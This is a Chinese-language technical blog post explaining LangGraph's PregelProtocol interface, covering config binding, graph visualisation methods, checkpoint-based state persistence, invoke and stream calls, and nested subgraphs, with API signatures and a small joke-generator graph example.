ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Pregel是对<code>PregelProtocol</code>协议的实现，后者的引入标志着 LangGraph 从一个单一的库进化为了一个可插拔的图计算框架。图可以视为“LangGraph 执行体”，而PregelProtocol定义了它必须具备的最小功能集合。我们从这协议的成员定义来看看这个功能集合包含哪些操作。</p>
<h2 data-id="heading-0">1. 配置绑定</h2>
<p>通过前面的内容我们会发现<code>RunnableConfig</code>这个对象几乎时无所不在，我们在调用Pregel对象的时候可以将它作为参数，用来提供用于控制其执行行为（比如迭代限制，并发控制等）的配置。执行引擎还将它作为容器用来下流流程传递一些组件和信号，所以前面的演示实例才可以在Node处理函数中从注入的RunnableConfig中提取像<code>Runtime</code>、<code>PregelScratchpad</code>、<code>Checkpoint命名空间</code>和<code>静态上下文</code>这样对象和信息。对于单纯Pregel的Node（不包括StateGraph的Node），RunnableConfig使唯一可以注入到处理函数中的参数，所以除了输入参数，其他所需的信息只能从它里面提取。</p>
<p><code>with_config</code>方法赋予了这个 “执行体”与配置绑定的能力。除了提供RunnableConfig对象，我们还可以利用关键词参数提供待绑定的配置。由于RunnableConfig本质上就是一个TypedDict对象，提供的关键字参数组成的键值对可以直接转换成RunnableConfig对象。with_config方法会将两者合并，生成一个新的RunnableConfig对象绑定到执行体上。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">with_config</span>(<span class="hljs-params">
        self, config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>, **kwargs: <span class="hljs-type">Any</span>
    </span>) -&gt; Self: ...
</code></pre>
<h2 data-id="heading-1">2. 可视化呈现</h2>
<p>PregelProtocol是LangGraph对 “图” 的抽象，这里的图是 “图论” 的概念，但是若真能将它的结构呈现在一张 “图片” 中，这无疑是非常有意义的。毕竟代码仅仅是面向程序员的语言，比不上图片，不但直观，还没有受众限制。LangGraph专门定义了如下这个Graph类型来表示面向 “可视化呈现” 的图。</p>
<p>一个Graph对象标识的图依然由Node和Edge构成。它的每个Node都有一个唯一标识，我们可以调用<code>next_id</code>方法为下一个待添加的Node生成此标识。我们不仅可以调用<code>add_node</code>、<code>remove_node</code>和<code>add_edge</code>这样的方法以添加/移除Node和Edge来构建图，还可以调用<code>extend</code>方法将另一个Graph的所有Node和Edge添加进来。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Graph</span>:
    nodes: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, Node] = field(default_factory=<span class="hljs-built_in">dict</span>)
    edges: <span class="hljs-built_in">list</span>[Edge] = field(default_factory=<span class="hljs-built_in">list</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next_id</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_node</span>(<span class="hljs-params">
        self,
        data: <span class="hljs-built_in">type</span>[BaseModel] | RunnableType | <span class="hljs-literal">None</span>,
        <span class="hljs-built_in">id</span>: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        metadata: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; Node
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_node</span>(<span class="hljs-params">self, node: Node</span>) -&gt; <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_edge</span>(<span class="hljs-params">
        self,
        source: Node,
        target: Node,
        data: Stringifiable | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        conditional: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,  <span class="hljs-comment"># noqa: FBT001,FBT002</span>
    </span>) -&gt; Edge
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">
        self, graph: Graph, *, prefix: <span class="hljs-built_in">str</span> = <span class="hljs-string">""</span>
    </span>) -&gt; <span class="hljs-built_in">tuple</span>[Node | <span class="hljs-literal">None</span>, Node | <span class="hljs-literal">None</span>]:

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reid</span>(<span class="hljs-params">self</span>) -&gt; Graph:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">first_node</span>(<span class="hljs-params">self</span>) -&gt; Node | <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">last_node</span>(<span class="hljs-params">self</span>) -&gt; Node | <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">trim_first_node</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">trim_last_node</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_json</span>(<span class="hljs-params">self, *, with_schemas: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]]
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_ascii</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_ascii</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
<span class="hljs-meta">    @overload</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_png</span>(<span class="hljs-params">
        self,
        output_file_path: <span class="hljs-built_in">str</span>,
        fontname: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        labels: LabelsDict | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-literal">None</span>: ...
<span class="hljs-meta">    @overload</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_png</span>(<span class="hljs-params">
        self,
        output_file_path: <span class="hljs-literal">None</span>,
        fontname: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        labels: LabelsDict | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">bytes</span>: ...
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_png</span>(<span class="hljs-params">
        self,
        output_file_path: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        fontname: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        labels: LabelsDict | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">bytes</span> | <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_mermaid</span>(<span class="hljs-params">
        self,
        *,
        with_styles: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span>,
        curve_style: CurveStyle = CurveStyle.LINEAR,
        node_colors: NodeStyles | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        wrap_label_n_words: <span class="hljs-built_in">int</span> = <span class="hljs-number">9</span>,
        frontmatter_config: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">str</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_mermaid_png</span>(<span class="hljs-params">
        self,
        *,
        curve_style: CurveStyle = CurveStyle.LINEAR,
        node_colors: NodeStyles | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        wrap_label_n_words: <span class="hljs-built_in">int</span> = <span class="hljs-number">9</span>,
        output_file_path: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        draw_method: MermaidDrawMethod = MermaidDrawMethod.API,
        background_color: <span class="hljs-built_in">str</span> = <span class="hljs-string">"white"</span>,
        padding: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span>,
        max_retries: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>,
        retry_delay: <span class="hljs-built_in">float</span> = <span class="hljs-number">1.0</span>,
        frontmatter_config: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        base_url: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        proxies: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">bytes</span>
</code></pre>
<p>调用<code>reid</code>方法可以返回一个新的Graph对象，它尽量保留途中可读性的元素，但是Node的ID会重新生成。Graph的<code>first_node</code>和<code>last_node</code>方法返回第一个和最后一个Node。如果我们希望删除第一个只有单一输出Edge或者最后一个只有单一输入Edge的Node，可以调用<code>trim_first_node</code>或者<code>trim_last_node</code>方法。</p>
<p>构建好的Graph可以采用不同的呈现方式。Graph提供了五个“绘图”方法，其中<code>draw_ascii</code>和<code>print_ascii</code>采用ascii码字符的呈现方式，前者返回具体的ascii码字符串，后者则直接在终端将图绘制出来，这种方法不依赖其他的绘图相关的包。<code>draw_mermaid</code>和<code>draw_mermaid_png</code>采用Mermaid图表的呈现方式，Mermaid 是一种基于文本的流程图定义语言，广泛支持于 GitHub、Notion 和各种编辑器中。draw_mermaid返回图标文本，而<code>draw_mermaid_png</code>则直接将图表进一步渲染成PNG图片。Graph对象也可以通过调用<code>draw_png</code>方法渲染成PNG图片，该方法最终会Graphviz（一个开源的图可视化软件）来布局和渲染图片。</p>
<p>再回到PregelProtocol类型的定义上，它定义了如下所示的<code>get_graph/aget_graph</code>方法，它们的返回类型DrawableGraph正是上述Graph类型的别名。该方法除了可以传入RunnableConfig对象作为可选配置外，还具有一个名为<code>xray</code>的参数。xray（X光）参数决定了你在查看图结构时，到底能看多深。它专门用于处理子图的展开显示。如果设置为False（默认值），图将以 “黑盒” 模式显式，如果你的图中包含子图，它只会显示为一个单一的节点。你看不见子图内部的任何节点、边或逻辑。反之将会采用 “全展开” 模式，它会像 X 光一样穿透所有层级，将所有嵌套子图内部的节点和连线全部平铺出来。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.runnables.graph <span class="hljs-keyword">import</span> Graph <span class="hljs-keyword">as</span> DrawableGraph
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_graph</span>(<span class="hljs-params">
        self,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        xray: <span class="hljs-built_in">int</span> | <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; DrawableGraph: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_graph</span>(<span class="hljs-params">
        self,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        xray: <span class="hljs-built_in">int</span> | <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; DrawableGraph: ...
</code></pre>
<p>在第一个演示实例中，我们创建了一个作为“笑话生成器”的Agent，现在我们将它简化，看看由它生成的Graph如何将图的结构以可视化的形式呈现出来。如下面的代码片段所示，我们利用StateGraph作为Builder，构建了一张由两个Node组成的图，它们和Start和End之间有四条边。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, START, END
<span class="hljs-keyword">from</span> langgraph.pregel.protocol <span class="hljs-keyword">import</span> PregelProtocol
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <span class="hljs-keyword">as</span> PILImage
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> MemorySaver

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_joke</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">regenerate_joke</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">pass</span>

builder = (
    StateGraph(<span class="hljs-built_in">dict</span>)
    .add_node(<span class="hljs-string">"generate_joke"</span>, generate_joke)
    .add_node(<span class="hljs-string">"regenerate_joke"</span>, regenerate_joke)
)

builder.add_edge(START, <span class="hljs-string">"generate_joke"</span>)
builder.add_edge(<span class="hljs-string">"regenerate_joke"</span>, END)
builder.add_conditional_edges(
    <span class="hljs-string">"generate_joke"</span>, <span class="hljs-keyword">lambda</span> _: <span class="hljs-string">"bad"</span>, {<span class="hljs-string">"good"</span>: END, <span class="hljs-string">"bad"</span>: <span class="hljs-string">"regenerate_joke"</span>}
)

app: PregelProtocol = builder.<span class="hljs-built_in">compile</span>(MemorySaver())
graph = app.get_graph()
graph.print_ascii()

<span class="hljs-built_in">bytes</span> = graph.draw_mermaid_png()
PILImage.<span class="hljs-built_in">open</span>(io.BytesIO(<span class="hljs-built_in">bytes</span>)).show()
</code></pre>
<p>在将StateGraph编译成Pregel对象后，我们调用其get_graph方法得到对应的Graph对象。我们以两种形式呈现其结构，前者通过调用print_ascii方法以ASCII字符的形式输出图结构，后者调用draw_mermaid_png方法生成一张PNG图片。下图左右两部分分别展现了两种呈现方式的效果。</p>
<h2 data-id="heading-2">3. 持久化</h2>
<p>为了支持“中断/恢复”的执行方式，同时为“时间旅行”提供支持，图必须利用持久化的方式将执行过程的重要时刻的状态保存下来。LangGraph采用基于<code>Checkpoint</code>的持久化形式，对于指定的每个任务，不论是执行成功针对Channel的写入意图，还是抛出异常、人为中断或者Resume Value的提供，都会以Pending Write的形式被记录下来；当超步成功完成，针对Channel的写入被成功应用，这些Pending Write被丢弃，换来一个Checkpoint来描述当前的状态。</p>
<p>作为“LangGraph 执行体”的抽象，PregelProtocol定义了<code>get_state/aget_state</code>方法用于读取在某个Superstep由Checkpoint（对于最后一个未完成的Superstep，还包括Pending Write）构建的状态快照，该快照体现为一个StateSnapshot对象。<code>get_state_history/aget_state_history</code>返回由这些快照谱写的一段历史。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_state</span>(<span class="hljs-params">
        self, config: RunnableConfig, *, subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; StateSnapshot: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_state</span>(<span class="hljs-params">
        self, config: RunnableConfig, *, subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; StateSnapshot: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_state_history</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        *,
        <span class="hljs-built_in">filter</span>: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        before: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        limit: <span class="hljs-built_in">int</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; Iterator[StateSnapshot]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_state_history</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        *,
        <span class="hljs-built_in">filter</span>: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        before: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        limit: <span class="hljs-built_in">int</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; AsyncIterator[StateSnapshot]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bulk_update_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        updates: <span class="hljs-type">Sequence</span>[<span class="hljs-type">Sequence</span>[StateUpdate]],
    </span>) -&gt; RunnableConfig: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">abulk_update_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        updates: <span class="hljs-type">Sequence</span>[<span class="hljs-type">Sequence</span>[StateUpdate]],
    </span>) -&gt; RunnableConfig: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        values: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span> | <span class="hljs-literal">None</span>,
        as_node: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; RunnableConfig: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aupdate_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        values: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span> | <span class="hljs-literal">None</span>,
        as_node: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; RunnableConfig: ...
</code></pre>
<p>持久化存储的Checkpoint不仅使我们可以回顾历史，还可以提供“时间旅行”，使我们可以从某个历史时刻重新执行后面的流程。不仅如此，PregelProtocol还提供了<code>update_state /bulk_update_state/abulk_update_state</code>可以直接修改状态。但是它们并非“篡改历史”，只是基于某个在某个历史时刻开启了另一段“平行宇宙”而已。持久化使LangGraph.Pregel作为核心和部分，我们将在后续部分对它进行专门的介绍。</p>
<h2 data-id="heading-3">4. 两种调用方式</h2>
<p>PregelProtocol的<code>invoke/ainvoke</code>和<code>stream/astream</code>方法体现了针对 “LangGraph 执行体” 两种调用方式。前者采用简单的请求/回复消息交换模式，客户端需要等整个流程结束之后采用得到结果。如果整个处理流程比较复杂，或者涉及一些耗时的操作，过长的等待会带来糟糕的体验。后者采用流式处理使客户端可以实施得到处理的中间结果或者感知到处理的进度。我们将在后续部分对流式处理进行单独介绍。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        stream_mode: StreamMode | <span class="hljs-built_in">list</span>[StreamMode] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; Iterator[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">astream</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        stream_mode: StreamMode | <span class="hljs-built_in">list</span>[StreamMode] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; AsyncIterator[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">ainvoke</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>: ...
</code></pre>
<p>执行体支持中断/恢复（interrupt/resume）的方式执行，所以在中断时需要将当时的状态以 “Checkpoint（Checkpoint）” 的形式保存下来，恢复执行的时候利用它们将当时的 “执行线程” 复原。Checkpointing的机制也使 “时间旅行” 成为可能，我们可以从任一Checkpoint开始执行。也正是因为此持久化机制的存在，我们可以提取某一个Superstep的状态，还可以查看整个执行历史，这两个功能分别对应PregelProtocol的<code>get_state/aget_state</code>和<code>get_state_history/aget_state_history</code>方法。具体的状态以StateSnapshot对象描述的快照表示。</p>
<p>执行体应该具有将执行结果作为新的状态进行保存的能力，所以PregelProtocol定义了<code>update_state/aupdate_state</code>和<code>bulk_update_state/abulk_update_state</code>方法，前者保存单一状态更新，后者对多个状态更新进行批量执行。单一状态更新通过如下这个名为StateUpdate的命名元组表示，我们不仅可以利用values字段得到以字典形式表示的状态值，还可以通过<code>as_node</code>和<code>task_id</code>字段的得到实施更新的Node和具体任务标识。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">StateUpdate</span>(<span class="hljs-title class_ inherited__">NamedTuple</span>):
    values: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span>
    as_node: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
    task_id: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
</code></pre>
<p>执行体支持两种基本的操作，一种采用单纯的请求/响应消息交换模式，另一种以流的形式实时返回数据，它们分别对应<code>invoke/ainvoke</code>和<code>stream/astream</code>方法。</p>
<h2 data-id="heading-4">5. 嵌套结构</h2>
<p>我们一直在强调图的“嵌套”结构，这种结构也可以从Pregel、PregelNode和PregelProtocol在三个类型的定义。一个Pregel是PregelProtocol的实现、作为其节点的PregelNode对象可以由一个或者多个PregelProtocol组成，对于表示 “子图” 的subgraphs字段，并且该字段返回一个PregelProtocol对象的序列。Pregel的subgraphs方法返回的子图就来源于组成它的Node。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelNode</span>:
    subgraphs	: <span class="hljs-type">Sequence</span>[PregelProtocol]

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Pregel</span>(
    PregelProtocol[StateT, ContextT, InputT, OutputT],
    <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_subgraphs</span>(<span class="hljs-params">
        self, *, namespace: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>, recurse: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; Iterator[<span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">str</span>, PregelProtocol]]

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_subgraphs</span>(<span class="hljs-params">
        self, *, namespace: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>, recurse: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; AsyncIterator[<span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">str</span>, PregelProtocol]]
</code></pre>
